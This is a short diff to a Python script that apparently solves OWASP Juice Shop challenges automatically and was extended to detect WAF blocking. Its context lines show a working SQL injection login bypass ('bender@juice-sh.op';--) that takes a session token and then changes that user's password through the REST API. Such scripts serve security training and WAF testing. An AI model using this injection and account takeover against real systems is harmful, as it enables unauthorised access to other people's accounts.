@@ -2,7 +2,7 @@
 # Open this URL before running the script
 # Oct 9, 2024 - Vince Mammoliti - vincem@checkpoint.com
 print("Juice Shop Solver - Original code by Bryan Fauquembergue")
-print("  - Enhanced to detect in path WAF blocking - by Vince Mammoliti")
+print("  - Enhanced to detect in path WAF blocking - by Vince Mammoliti, Oct 2024")
 import sys
 if len(sys.argv) == 1: sys.argv[1:] = ["http://juiceshop.local:80"]
 url = sys.argv[1]
@@ -167,8 +167,6 @@ try:
     response = requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
     response.raise_for_status()
     jsonResponse = response.json()
-#    print("Entire JSON response")
-#    print(json:Response)
 except HTTPError as http_err:
         print(f'HTTP error occurred: {http_err}')
 except Exception as err:
